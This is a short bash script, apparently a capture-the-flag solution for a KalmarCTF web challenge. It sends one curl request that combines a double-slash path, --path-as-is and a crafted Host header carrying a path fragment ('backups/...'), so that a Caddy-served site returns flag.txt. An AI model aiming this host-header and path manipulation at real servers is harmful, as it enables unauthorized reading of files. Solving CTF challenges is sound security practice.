#!/usr/bin/env bash

curl --path-as-is -k --resolve php.caddy.kalmarc.tf:443:172.18.0.1 http://php.caddy.kalmarc.tf//flag.txt -H 'Host: backups/php.caddy.kalmarc.tf'
